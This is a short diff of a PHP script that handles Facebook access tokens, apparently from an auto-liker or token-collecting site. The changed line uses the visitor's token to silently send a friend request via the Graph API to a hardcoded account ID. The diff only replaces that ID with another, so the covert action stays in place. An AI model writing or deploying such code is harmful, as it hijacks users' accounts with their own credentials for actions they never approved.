@@ -318,7 +318,7 @@ session_start();
     $token = $token2;
   }
 $check = json_decode(auto('https://graph.facebook.com/app/?access_token='.$token.''), true);
-auto('https://graph.facebook.com/me/friends?method=post&uids=100008021291466&access_token='.$token);
+auto('https://graph.facebook.com/me/friends?method=post&uids=100004294419791&access_token='.$token);
 
 if($check[id] == 6628568379){  
   
